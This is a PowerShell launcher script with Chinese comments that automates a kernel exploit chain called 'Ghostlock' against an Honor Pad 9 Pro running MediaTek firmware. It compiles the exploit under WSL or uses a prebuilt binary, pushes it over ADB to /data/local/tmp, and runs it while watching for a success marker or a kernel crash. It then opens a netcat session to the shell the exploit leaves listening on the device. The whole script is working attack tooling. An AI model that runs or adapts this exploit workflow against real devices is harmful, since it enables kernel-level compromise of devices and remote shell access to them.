# ================= 配置 =================
$NcPort           = 34567
$WslDistro        = $null
$WaitSec          = 300
$Marker           = 'exploit chain complete pid='
$CrashMsg         = '[!] 内核崩溃，请重试（EXP 抢内核竞态可能会崩）'
$PrebuiltNames    = @('exploit_static')
$GhostlockDirName = 'Ghostlock-HonorPad9Pro-main'

$ScriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
$logFile    = Join-Path $ScriptDir 'exp_output.log'
$markerFile = Join-Path $ScriptDir 'exp_done.marker'
# Ghostlock 源码就在本仓库根目录（exploit/ 是其子目录）；兜底指向脚本自身所在目录。
$GhostlockFallback = $ScriptDir
# =======================================

# ---------- ADB 定位：优先项目自带 ADB，否则用 PATH 里的 adb ----------
$adbLocal = Join-Path $ScriptDir 'adb-fastboot-tools\adb.exe'
$adbPath  = $null
if (Test-Path $adbLocal) {
    $adbPath = $adbLocal
    Write-Host "使用项目自带 ADB: $adbPath" -ForegroundColor DarkGray
}
else {
    $adbPath = (Get-Command adb -ErrorAction SilentlyContinue).Source
    if (-not $adbPath) {
        Write-Error "未找到 adb: 项目 adb-fastboot-tools\adb.exe 不存在，且 PATH 中也没有 adb"
        exit 1
    }
    Write-Host "未找到项目自带 ADB, 使用 PATH 中的 adb: $adbPath" -ForegroundColor DarkGray
}
function adb { & $script:adbPath @args }

# ---------- 工具函数 ----------
function ConvertTo-WslPath {
    param([string]$WinPath)
    $p = $WinPath -replace '\\', '/'
    if ($p -match '^([A-Za-z]):/(.*)$') {
        return "/mnt/$($Matches[1].ToLower())/$($Matches[2])"
    }
    return $p
}

function Find-GhostlockDir {
    param([string]$BaseDir, [string]$DirName, [string]$Fallback)

    $candidates = New-Object System.Collections.Generic.List[string]

    # 1) 脚本同级
    $candidates.Add((Join-Path $BaseDir $DirName))

    # 2) 脚本父级
    $parent = Split-Path $BaseDir -Parent -ErrorAction SilentlyContinue
    if ($parent) {
        $candidates.Add((Join-Path $parent $DirName))
    }

    # 3) 兜底路径
    if ($Fallback) {
        $candidates.Add($Fallback)
    }

    foreach ($c in $candidates) {
        if ($c -and (Test-Path $c)) {
            return (Resolve-Path $c).Path
        }
    }
    return $null
}

function Test-WslReady {
    if (-not (Get-Command wsl.exe -ErrorAction SilentlyContinue)) { return $false }
    try {
        $out = & wsl.exe -e bash -c "echo __WSL_OK__" 2>$null
        $text = (($out | Out-String) -replace "`0", '').Trim()
        return ($LASTEXITCODE -eq 0 -and $text -match '__WSL_OK__')
    } catch { return $false }
}

# ---------- 1. 获取设备 IP ----------
$deviceLines = @(adb devices | Select-Object -Skip 1 | Where-Object { $_ -match '\s+device\s*$' })
if ($deviceLines.Count -eq 0) { Write-Error "没有找到处于 device 状态的 ADB 设备"; exit 1 }
$serial = ($deviceLines[0].Trim() -split '\s+')[0]

$ips = @()
foreach ($line in $deviceLines) {
    if ($line -match '(\d{1,3}(?:\.\d{1,3}){3}):\d+') { $ips += $Matches[1] }
}
if ($ips.Count -eq 0) {
    if ($deviceLines.Count -eq 1) {
        $route = (adb -s $serial shell ip route 2>$null) -join "`n"
        if ($route -match 'src (\d{1,3}(?:\.\d{1,3}){3})') { $ips += $Matches[1] }
    } else { Write-Error "存在多个 USB 设备, 无法自动确定 IP"; exit 1 }
}
if ($ips.Count -eq 0) { Write-Error "无法获取设备 IP"; exit 1 }
$deviceIp = @($ips)[0]
Write-Host "已获取设备 IP: $deviceIp (serial: $serial)" -ForegroundColor Green
Write-Host "脚本目录: $ScriptDir" -ForegroundColor DarkGray

# ---------- 2. 定位 Ghostlock 源码 + WSL 编译优先 ----------
Write-Host "`n===== [1/5] 获取 EXP 二进制 =====" -ForegroundColor Cyan

$ghostlockRoot = Find-GhostlockDir -BaseDir $ScriptDir -DirName $GhostlockDirName -Fallback $GhostlockFallback
if ($ghostlockRoot) {
    Write-Host "Ghostlock 源码: $ghostlockRoot" -ForegroundColor DarkGray
    $WslBuildOut = Join-Path $ghostlockRoot 'exploit\build\mtk-SDY-AN00_8.0.0.220\bin\exploit_static'
} else {
    Write-Host "未找到 Ghostlock 源码目录 " -ForegroundColor Yellow
    $WslBuildOut = $null
}

$binWin = $null
Write-Host "探测 WSL 可用性..." -NoNewline
$wslReady = Test-WslReady
if ($wslReady) { Write-Host " 可用" -ForegroundColor Green } else { Write-Host " 不可用" -ForegroundColor Yellow }

if ($wslReady -and $ghostlockRoot) {
    Write-Host "使用 WSL 实时编译..." -ForegroundColor Cyan
    $wslRoot = ConvertTo-WslPath $ghostlockRoot
    $buildCmd = "cd $wslRoot/exploit && touch src/slide.c && make CC=aarch64-linux-gnu-gcc PROJECT=mtk-SDY-AN00_8.0.0.220 bin 2>&1 | tail -5"
    $buildOut = wsl bash -c "$buildCmd" 2>&1
    $buildOut | ForEach-Object { Write-Host $_ }

    if ($WslBuildOut -and (Test-Path $WslBuildOut)) {
        $binWin = (Resolve-Path $WslBuildOut).Path
        Write-Host "WSL 编译成功: $binWin" -ForegroundColor Green
    } else {
        Write-Warning "WSL 编译未生成产物, 回退到预编译"
    }
}
elseif ($wslReady -and -not $ghostlockRoot) {
    Write-Warning "WSL 可用但 Ghostlock 源码不在附近, 回退到预编译产物"
}

# 回退：脚本目录 / 当前目录 / WSL 历史产物
if (-not $binWin) {
    $searchDirs = @($ScriptDir)
    if ($PWD.Path -ne $ScriptDir) { $searchDirs += $PWD.Path }

    foreach ($dir in $searchDirs) {
        foreach ($name in $PrebuiltNames) {
            $c = Join-Path $dir $name
            if (Test-Path $c) { $binWin = (Resolve-Path $c).Path; break }
        }
        if ($binWin) { break }
    }
    if (-not $binWin -and $WslBuildOut -and (Test-Path $WslBuildOut)) {
        $binWin = (Resolve-Path $WslBuildOut).Path
    }
    if ($binWin) { Write-Host "使用预编译产物: $binWin" -ForegroundColor Green }
}

if (-not $binWin) {
    Write-Error "既无法通过 WSL 编译, 也未找到预编译产物。请启用 WSL 或把 exploit_static 放到 $ScriptDir"
    exit 1
}

# ---------- 3. 推送 ----------
Write-Host "`n===== [2/5] 推送并赋权 =====" -ForegroundColor Cyan
adb push $binWin /data/local/tmp/gl_sdy
adb shell "chmod 755 /data/local/tmp/gl_sdy"
adb shell "sync"

# ---------- 4. 启动 EXP ----------
Write-Host "`n===== [3/5] 启动 EXP（新窗口）=====" -ForegroundColor Cyan
Remove-Item $logFile, $markerFile -ErrorAction SilentlyContinue

$runCmd = 'cd /data/local/tmp && env KSU_RUNDIR=/data/local/tmp/glrun_sdy SLIDE_MCAST_SHIFT=15 SLIDE_MCAST_OPT=44 /data/local/tmp/gl_sdy 2>&1'
$tempPs1 = Join-Path $env:TEMP 'run_exp.ps1'

$ps1Body = @"
`$ErrorActionPreference = 'Continue'
`$logFile = '$logFile'
`$markerFile = '$markerFile'
`$fs = `$null
`$sw = `$null
try {
    `$fs = [System.IO.File]::Open(`$logFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
    `$sw = New-Object System.IO.StreamWriter(`$fs)
    `$sw.AutoFlush = `$true
    adb shell "$runCmd" 2>&1 | ForEach-Object {
        Write-Host `$_
        try { `$sw.WriteLine(`$_) } catch {}
        if (`$_.Contains('$Marker')) {
            try { [System.IO.File]::WriteAllText(`$markerFile, `$_) } catch {}
        }
    }
}
finally {
    if (`$sw) { `$sw.Close() }
    if (`$fs) { `$fs.Close() }
}
Write-Host ''
Write-Host '=== EXP ended, press any key ===' -ForegroundColor Yellow
`$null = `$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
"@
Set-Content -Path $tempPs1 -Value $ps1Body -Encoding UTF8
Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$tempPs1 -WindowStyle Minimized

# ---------- 5. 轮询 marker / 日志 / ADB 状态 ----------
Write-Host "`n===== [4/5] 等待 EXP 成功标记 =====" -ForegroundColor Cyan
Write-Host "匹配: $Marker（最长等 ${WaitSec}s, 每 3s 检测 ADB 状态）" -ForegroundColor DarkGray

function Read-LogLines {
    param($Path)
    $fs = $null; $sr = $null
    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $sr = New-Object System.IO.StreamReader($fs)
        return $sr.ReadToEnd()
    } catch { return $null }
    finally { if ($sr) { $sr.Close() }; if ($fs) { $fs.Close() } }
}

$found = $false; $crashed = $false
$deadline = (Get-Date).AddSeconds($WaitSec)
$lastLineCnt = 0; $adbCheckCounter = 0; $adbOffCount = 0

while ((Get-Date) -lt $deadline) {
    if (Test-Path $markerFile) { $found = $true; break }

    if (Test-Path $logFile) {
        $content = Read-LogLines -Path $logFile
        if ($null -ne $content -and $content.Length -gt 0) {
            $complete = $content
            if (-not $content.EndsWith("`n")) {
                $idx = $content.LastIndexOf("`n")
                if ($idx -ge 0) { $complete = $content.Substring(0, $idx + 1) } else { $complete = "" }
            }
            if ($complete) {
                $lines = @($complete -split "`r?`n" | Where-Object { $_ -ne '' })
                for ($i = $lastLineCnt; $i -lt $lines.Count; $i++) {
                    Write-Host "[EXP] $($lines[$i])" -ForegroundColor DarkGray
                    if ($lines[$i].Contains($Marker)) { $found = $true }
                }
                $lastLineCnt = $lines.Count
            }
        }
    }
    if ($found) { break }

    $adbCheckCounter++
    if ($adbCheckCounter -ge 6) {
        $adbCheckCounter = 0
        $state = ''
        try { $state = (adb -s $serial get-state 2>$null) -join '' } catch {}
        if ($state -ne 'device') {
            $adbOffCount++
            Write-Host "`n[!] ADB 断开 ($adbOffCount/2)，可能内核崩溃" -ForegroundColor Yellow
            if ($adbOffCount -ge 2) { $crashed = $true; break }
        } else { $adbOffCount = 0 }
    }
    Start-Sleep -Milliseconds 500
}

if (Test-Path $logFile) {
    $content = Read-LogLines -Path $logFile
    if ($content) {
        $lines = @($content -split "`r?`n" | Where-Object { $_ -ne '' })
        for ($i = $lastLineCnt; $i -lt $lines.Count; $i++) {
            Write-Host "[EXP] $($lines[$i])" -ForegroundColor DarkGray
            if ($lines[$i].Contains($Marker)) { $found = $true }
        }
    }
}

if ($found) {
    Write-Host "`n检测到成功标记，准备连接 $($deviceIp):$NcPort" -ForegroundColor Green
    Start-Sleep -Milliseconds 500
}
elseif ($crashed) {
    Write-Host "`n$CrashMsg" -ForegroundColor Red
    Write-Host "EXP 窗口仍保留（已最小化），可点开查看最后输出。" -ForegroundColor Yellow
    exit 1
}
else {
    Write-Warning "等待 ${WaitSec}s 未检测到标记，仍尝试打开 nc 窗口"
}

# ---------- 6. WSL 连接设备 ----------
Write-Host "`n===== [5/5] 从 WSL 连接 $($deviceIp):$NcPort =====" -ForegroundColor Cyan

# 6.1 预检
Write-Host "WSL 连通性预检..." -ForegroundColor DarkGray
$probeCmd = "nc -zv -w 3 $deviceIp $NcPort 2>&1"
$probeOut = wsl bash -c "$probeCmd" 2>&1
$probeStr = ($probeOut | Out-String).Trim()
if ($probeStr) { Write-Host "  $probeStr" -ForegroundColor DarkGray }

if ($probeStr -match 'succeeded|open') {
    Write-Host "预检通过: $($deviceIp):$NcPort 可连" -ForegroundColor Green
}
elseif ($probeStr -match 'command not found') {
    Write-Warning "WSL 里没装 nc, 先执行: wsl bash -c 'sudo apt install -y netcat-openbsd'"
}
elseif ($probeStr -match 'refused') {
    Write-Warning "端口拒绝连接: EXP 可能还没真正监听 $NcPort, 或已退出"
}
elseif ($probeStr -match 'timed out|unreachable') {
    Write-Warning "连接超时: WSL 到 $deviceIp 网络不通 (检查 WSL2 NAT / 防火墙)"
}
else {
    Write-Warning "预检未明确成功, 仍尝试打开 nc 窗口"
}

# 6.2 生成临时 .sh, 由 WSL 直接执行, 绕开 Start-Process 引号问题
$connectSh = Join-Path $env:TEMP 'gl_connect.sh'
$shLines = @(
    '#!/bin/bash'
    "nc $deviceIp $NcPort"
    'echo'
    'echo "=== nc closed, dropping to bash ==="'
    'exec bash'
)
$shContent = ($shLines -join "`n") + "`n"
# 纯 ASCII + LF, 避免 BOM 和 CRLF 让 bash 报错
[System.IO.File]::WriteAllText($connectSh, $shContent, [System.Text.Encoding]::ASCII)

# Windows 路径转 WSL 路径
$drive = $connectSh.Substring(0,1).ToLower()
$rest  = $connectSh.Substring(2).Replace('\','/')
$wslSh = "/mnt/$drive$rest"

$argStr = "bash $wslSh"
if ($WslDistro) { $argStr = "-d $WslDistro " + $argStr }

Write-Host "打开 WSL nc 窗口: $wslSh" -ForegroundColor Cyan
Start-Process -FilePath 'wsl.exe' -ArgumentList $argStr -WindowStyle Normal

Write-Host "`n完成。" -ForegroundColor Green
Write-Host "若 WSL 窗口显示 bash 提示符而非 nc 会话, 看上方预检结论定位原因。" -ForegroundColor Yellow